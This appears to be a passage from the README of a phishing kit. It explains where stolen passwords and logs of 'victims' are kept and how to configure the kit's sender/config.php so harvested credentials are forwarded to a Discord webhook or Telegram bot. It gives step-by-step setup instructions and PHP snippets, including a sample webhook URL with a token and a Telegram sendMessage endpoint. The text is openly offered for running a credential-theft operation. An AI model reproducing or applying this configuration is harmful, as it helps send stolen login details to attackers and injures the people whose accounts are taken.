Bydefault password and logs are stored under [/victims](../victims)

If you like password and logs to be sent via **discord** or **telegram**, just update [sender/config.php](../sender/config.php) like above examples. 

## Discord 
- Create a new server
- Right click on server icon, `Server Settings` > `Integrations` > `Create Webhook`
- Now click on `Copy Webhook URL` and insert in following code
```php
<?php
$discord = 'Enter discord webhook link here';

//Example:
//$discord = 'https://discord.com/api/webhooks/818892216943509504/iaF6RJ2SA1eH4dyWq4iMWNNigAHCzzLGK6e_DBOzPCkh0C6-R0UQ8TWjW87vi51K30Ei';
?>
```

## Telegram 
- Create new bot
- Copy its token and insert inside `$token` variable
- To get id of channel or group, share invite link to @IDbot at telegram, it will reply with id in format `-xxxxxxxx`. x is numeric value. and insert that id in `$chat_id` variable
```php
<?php

$token = 'your bot token here';
$chat_id = 'id of channel or group where logs should be sent';

//Example: $token = '6789:652668';
//Example: $chat_id = '-1007328423944';
$telegram = 'https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chat_id;
?>
```

**Note:** You can use both at parallel as well. 
